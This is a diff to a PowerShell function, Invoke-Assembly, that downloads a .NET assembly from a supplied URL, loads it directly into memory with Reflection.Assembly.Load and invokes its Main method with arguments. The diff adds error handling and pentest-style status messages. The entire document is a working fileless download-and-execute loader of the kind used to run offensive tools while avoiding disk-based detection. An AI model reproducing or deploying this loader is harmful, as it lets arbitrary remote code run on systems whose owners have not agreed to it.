@@ -23,27 +23,46 @@ Function Invoke-Assembly {
 			[Parameter()]
 			[String[]]$Arguments = ""
 	)
+	$foundMain = $false
 	try {
 		$asm_data = ([net.webclient]::new()).downloaddata($Url)
 	}
 	catch {
-		
+		Write-Output "[!] Could not download assembly from the specified Url"
+		throw
 	}
-	$assembly = [Reflection.Assembly]::Load($asm_data)
+	try {
+		$assembly = [Reflection.Assembly]::Load($asm_data)
+	}
+	catch {
+		Write-Output "[!] Could not load assembly. Is it in COFF/MSIL/.NET format?"
+		throw
+	}
 	
 	foreach($type in $assembly.GetExportedTypes()) {
 		foreach($method in $type.GetMethods()) {
 			if($method.Name -eq "Main") {
+				$foundMain = $true
 				if($Arguments[0] -eq "") {
-					echo "[*] Attempting to load assembly with no arguments"
+					Write-Output "[*] Attempting to load assembly with no arguments"
 				}
 				else {
-					echo "[*] Attempting to load assembly with arguments: $arguments"
+					Write-Output "[*] Attempting to load assembly with arguments: $arguments"
 				}
 				$a = (,[String[]]@($Arguments))
-				$output = $method.Invoke($null, $a)
-				$output
+				try {
+					$output = $method.Invoke($null, $a)
+					Write-Output $output
+				}
+				catch {
+					Write-Output "[!] Could not invoke assembly or program crashed during execution"
+					throw
+				}
 			}
 		}
+	}
+	if(!$foundMain) {
+		Write-Output "[!] Could not find public Main() function. Did you set the namespace as public?"
+		throw
 	}
 }
